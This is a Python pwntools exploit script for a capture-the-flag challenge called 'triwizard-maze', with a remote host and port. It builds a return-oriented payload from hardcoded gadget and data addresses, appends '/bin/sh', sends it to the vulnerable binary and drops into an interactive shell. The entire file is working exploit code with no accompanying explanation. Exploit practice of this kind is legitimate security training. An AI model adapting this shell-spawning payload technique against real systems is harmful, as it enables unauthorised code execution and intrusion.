#!/usr/bin/env python3
from pwn import *

bin_name = "./bin"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("triwizard-maze.challs.cyberchallenge.it", 38202)
    else:
        return process(elf.path)

def main():
    r = conn()
    syscall = 0x133722AE
    data_addr = 0x13375E60
    pops_4 = 0x13372339
    payload = flat([
        syscall,
        pops_4,
        0x127,
        3,
        data_addr+28,
        0
    ],length=1024,filler=b'\x00')
    payload += b'/bin/sh\x00'
    r.sendafter(b'):',payload)
    r.interactive()

if __name__ == "__main__":
    main()
